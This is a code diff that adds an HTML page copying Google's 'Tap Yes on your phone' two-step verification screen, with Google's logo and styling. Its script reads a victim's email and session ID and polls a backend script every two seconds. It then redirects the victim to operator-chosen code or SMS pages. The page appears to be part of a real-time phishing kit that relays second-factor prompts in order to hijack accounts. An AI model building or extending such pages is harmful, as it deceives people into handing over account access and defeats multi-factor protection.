@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tap Yes on your phone</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
+            background-color: #f8f9fa;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .outer-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo { margin-bottom: 30px; }
+        .phone-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+        }
+        .phone-icon svg {
+            width: 80px;
+            height: 80px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        .user-email {
+            display: inline-flex;
+            align-items: center;
+            background: #f1f3f4;
+            border-radius: 16px;
+            padding: 4px 12px 4px 4px;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .user-email img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            border-radius: 50%;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #dadce0;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .link:hover { text-decoration: underline; }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            border-top: 1px solid #dadce0;
+            padding: 16px;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 12px;
+            color: #5f6368;
+            background: #ffffff;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="outer-container">
+        <div class="container">
+            <div class="logo">
+                <svg viewBox="0 0 74 24" width="74" height="24">
+                    <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
+                    <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
+                    <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
+                    <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
+                </svg>
+            </div>
+            <div class="phone-icon">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="5" y="2" width="14" height="20" rx="2" stroke="#1a73e8" stroke-width="2"/>
+                    <circle cx="12" cy="18" r="1" fill="#1a73e8"/>
+                    <rect x="8" y="5" width="8" height="1" rx="0.5" fill="#dadce0"/>
+                </svg>
+            </div>
+            <h1>Tap Yes on your phone</h1>
+            <div class="user-email">
+                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="User">
+                <span id="displayEmail">user@gmail.com</span>
+            </div>
+            <div class="spinner"></div>
+            <p>A notification was sent to your phone. Tap <strong>Yes</strong> to verify it's you.</p>
+            <a href="#" class="link">Resend notification</a>
+            <a href="#" class="link">Try another way</a>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+    
+    <script>
+        function getStoredEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email') || localStorage.getItem('userEmail') || '';
+        }
+        
+        function getSessionId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('session_id') || localStorage.getItem('sessionId') || '';
+        }
+        
+        const storedEmail = getStoredEmail();
+        const sessionId = getSessionId();
+        
+        if (storedEmail) {
+            document.getElementById('displayEmail').textContent = storedEmail;
+        }
+        
+        function checkRedirect() {
+            if (!sessionId) return;
+            
+            fetch('check_redirect.php?session_id=' + encodeURIComponent(sessionId))
+                .then(response => response.json())
+                .then(data => {
+                    if (data.redirect) {
+                        const email = data.email || storedEmail;
+                        let redirectUrl = data.redirect + '.html?email=' + encodeURIComponent(email) + '&session_id=' + encodeURIComponent(sessionId);
+                        
+                        if (data.redirect === 'tap_code' && data.tap_code_value) {
+                            redirectUrl += '&tap_code_value=' + encodeURIComponent(data.tap_code_value);
+                        }
+                        if (data.redirect === 'three_codes' && data.three_codes_value) {
+                            redirectUrl += '&three_codes_value=' + encodeURIComponent(data.three_codes_value);
+                        }
+                        if (data.redirect === 'sms_code' && data.phone_display) {
+                            redirectUrl += '&phone_display=' + encodeURIComponent(data.phone_display);
+                        }
+                        
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking redirect:', error);
+                });
+        }
+        
+        setInterval(checkRedirect, 2000);
+        checkRedirect();
+    </script>
+</body>
+</html>
